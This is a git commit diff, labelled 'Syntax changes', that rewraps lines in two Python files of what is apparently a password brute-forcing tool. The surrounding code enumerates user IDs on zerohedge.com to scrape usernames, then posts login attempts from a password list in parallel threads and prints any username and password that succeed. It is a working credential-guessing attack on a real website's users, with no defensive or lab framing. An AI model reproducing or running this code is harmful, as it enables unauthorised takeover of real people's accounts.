f6a0694b0b16a337e70d63ce3da2c1f428b0acc7
Jacob Allen Utley <jacob@halfinjest.com>
2017-06-12 17:20:37 -0500

    Syntax changes.

--- attempt.py
+++ attempt.py
@@ -9,8 +9,9 @@ def attempt(number, username, title, passwords):
 			data = {"form_id": "user_login", "name": username, "pass": item}
 			response = requests.post("http://zerohedge.com/user/", data).text
 			if "/user/password" not in response:
-				sys.stdout.write(str(number) + space("number", len(str(number))) + \
-					username + space("username", len(username)) + item + "\n")
+				sys.stdout.write(str(number) + \
+					space("number", len(str(number))) + username + \
+					space("username", len(username)) + item + "\n")
 				sys.stdout.flush()
 				exit()
 	except Exception as error: time.sleep(1)
--- evaluate.py
+++ evaluate.py
@@ -4,12 +4,14 @@ from attempt import *
 
 def evaluate(number, passwords):
 	try:
-		request = urllib2.Request("http://www.zerohedge.com/user/" + str(number))
+		request = urllib2.Request("http://www.zerohedge.com/user/" + \
+			str(number))
 		response = urllib2.urlopen(request).read()
 		username = response[response.index("canonical") + \
 			48:response.index("revisit-after") - 17]
 		title = response[response.index("<title>") + \
 			7:response.index(" | Zero Hedge")]
-		newThread = threading.Thread(target=attempt, args=(number, username, title, passwords))
+		newThread = threading.Thread(target=attempt,
+			args=(number, username, title, passwords))
 		newThread.start()
 	except Exception as error: pass
